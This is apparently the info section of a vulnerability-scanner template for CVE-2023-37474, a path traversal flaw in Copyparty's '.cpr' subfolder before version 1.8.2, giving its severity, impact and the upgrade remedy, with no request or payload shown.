id: CVE-2023-37474

info:
  name: Copyparty <= 1.8.2 - Directory Traversal
  author: shankar acharya,theamanrawat
  severity: high
  description: |
    Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory. This issue has been addressed in commit `043e3c7d` which has been included in release 1.8.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.
  impact: |
    Unauthenticated attackers can exploit path traversal in the .cpr subfolder to read arbitrary files from the file server, potentially accessing sensitive system files and user data stored outside the web document root.
  remediation: |
    Update Copyparty to version 1.8.2 or later that properly validates file paths in the .cpr subfolder and prevents directory traversal attacks.
